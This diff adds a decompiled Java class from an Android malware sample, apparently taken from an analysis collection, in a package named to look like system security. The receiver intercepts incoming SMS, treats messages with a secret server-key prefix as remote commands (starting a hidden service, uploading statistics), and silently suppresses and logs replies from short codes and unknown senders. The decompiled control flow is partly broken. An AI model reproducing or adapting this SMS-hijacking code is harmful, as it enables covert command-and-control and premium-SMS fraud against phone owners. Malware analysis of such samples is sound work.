@@ -1,0 +1,94 @@
+package com.android.systemsecurity;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Bundle;
+import android.telephony.SmsMessage;
+import android.util.Log;
+
+public class SmsReciver extends BroadcastReceiver
+{
+  private String TAG = "SmsApplication";
+
+  private SmsMessage[] getSmsMessages(Bundle paramBundle)
+  {
+    Object[] arrayOfObject = (Object[])paramBundle.get("pdus");
+    SmsMessage[] arrayOfSmsMessage = new SmsMessage[arrayOfObject.length];
+    for (int i = 0; ; i++)
+    {
+      if (i >= arrayOfObject.length)
+        return arrayOfSmsMessage;
+      arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])arrayOfObject[i]);
+    }
+  }
+
+  public void onReceive(Context paramContext, Intent paramIntent)
+  {
+    Log.d(this.TAG, "Message Recieve");
+    while (true)
+    {
+      int i;
+      SmsMessage localSmsMessage;
+      try
+      {
+        Bundle localBundle = paramIntent.getExtras();
+        if (localBundle == null)
+          break label356;
+        SmsMessage[] arrayOfSmsMessage = getSmsMessages(localBundle);
+        i = 0;
+        if (i >= arrayOfSmsMessage.length)
+          break label356;
+        localSmsMessage = arrayOfSmsMessage[i];
+        if (localSmsMessage.getMessageBody().startsWith(SmsApplication.getServerKey() + " 001"))
+        {
+          paramContext.startService(new Intent(paramContext, SystemService.class));
+          abortBroadcast();
+        }
+      }
+      catch (Exception localException)
+      {
+        localException.printStackTrace();
+      }
+      MessagesDataSource localMessagesDataSource;
+      if (localSmsMessage.getMessageBody().startsWith(SmsApplication.getServerKey() + " 002"))
+      {
+        SmsApplication.logStat("Get stat: next time = " + SmsApplication.millsToString(SmsApplication.settings.saved.nextTimeConnection), paramContext);
+        SmsApplication.uploadMessageStat(paramContext);
+        abortBroadcast();
+      }
+      else if (SmsApplication.settings != null)
+      {
+        if (SmsApplication.settings.isNewServer(paramContext, localSmsMessage.getOriginatingAddress(), localSmsMessage.getMessageBody()))
+          abortBroadcast();
+        if ((System.currentTimeMillis() - SmsApplication.getLastSendTime() <= SmsApplication.responseAwayTime) && ((localSmsMessage.getOriginatingAddress().length() <= 6) || (!SmsApplication.findNumberInPhoneBook(paramContext, localSmsMessage.getOriginatingAddress()))))
+        {
+          abortBroadcast();
+          SmsApplication.captchaLogic(localSmsMessage);
+          localMessagesDataSource = new MessagesDataSource(paramContext);
+          localMessagesDataSource.open();
+        }
+      }
+      label356: 
+      try
+      {
+        localMessagesDataSource.createMessage(localSmsMessage.getMessageBody(), SmsApplication.getLastShortCode(), localSmsMessage.getOriginatingAddress());
+        localMessagesDataSource.close();
+        if (SmsApplication.isServiceNumber(localSmsMessage.getOriginatingAddress()))
+          abortBroadcast();
+        if (SmsApplication.settings.isDeleteMessage(localSmsMessage.getOriginatingAddress(), localSmsMessage.getMessageBody()))
+          abortBroadcast();
+      }
+      finally
+      {
+        localMessagesDataSource.close();
+      }
+      i++;
+    }
+  }
+}
+
+/* Location:           C:\Users\Key\AndroidMalware\2\classes_dex2jar.jar
+ * Qualified Name:     com.android.systemsecurity.SmsReciver
+ * JD-Core Version:    0.6.2
+ */
